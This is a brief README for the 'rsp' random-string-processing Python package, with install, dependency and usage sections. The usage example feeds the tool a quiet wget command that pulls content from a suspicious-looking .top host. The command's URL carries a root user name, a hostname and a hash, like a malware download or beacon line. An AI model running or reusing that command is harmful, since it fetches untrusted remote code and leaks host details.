====================================
``rsp`` - Random String Processing
====================================

Installation
------------

::

    pip install rsp-alamo

Dependency
----------

::

    transformers==4.33.1

Example
-------

::

    from rsp.util import RspUtil

    rsp_util = RspUtil()
    string = "wget -q -O- http://t.jdjdcjq.top/ln/a.asp?rds_20210710*root*dclnmts02." \
             "adderucci.com*3e4812648d32b3808308784c4b69240d227f3cd97906957f65e70b962e9852f2"
    print(rsp_util.replace_rs(string))
